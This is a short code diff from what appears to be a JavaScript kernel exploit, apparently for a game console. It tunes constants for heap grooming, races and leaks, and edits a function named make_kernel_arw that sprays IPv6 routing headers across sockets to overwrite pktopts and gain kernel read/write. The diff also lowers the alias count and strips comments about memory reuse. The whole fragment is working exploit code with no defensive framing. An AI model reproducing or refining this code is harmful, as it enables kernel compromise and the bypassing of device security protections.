@@ -136,7 +136,7 @@ const main_core = 7;
 const num_grooms = 0x200;
 const num_handles = 0x100;
 const num_sds = 0x100; // max is 0x100 due to max IPV6_TCLASS
-const num_alias = 150; //TODO: check best value here for 9.xx
+const num_alias = 100; //TODO: check best value here for 9.xx
 const num_races = 200;
 const leak_len = 16;
 const num_leaks = 5;
@@ -1329,17 +1329,13 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     const pktopts = new Buffer(0x100);
     const rsize = build_rthdr(pktopts, pktopts.size);
     const pktinfo_p = k100_addr.add(0x10);
-    // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
     pktopts.write64(0x10, pktinfo_p);
 
-    log('overwrite main pktopts');
+    log('overwrite main pktopts');    
     let reclaim_sd = null;
     close(pktopts_sds[1]);
     for (let i = 0; i < num_alias; i++) {
         for (let i = 0; i < num_sds; i++) {
-            // if a socket doesn't have a pktopts, setting the rthdr will make
-            // one. the new pktopts might reuse the memory instead of the
-            // rthdr. make sure the sockets already have a pktopts before
             pktopts.write32(off_tclass, 0x4141 | i << 16);
             set_rthdr(sds[i], pktopts, rsize);
         }
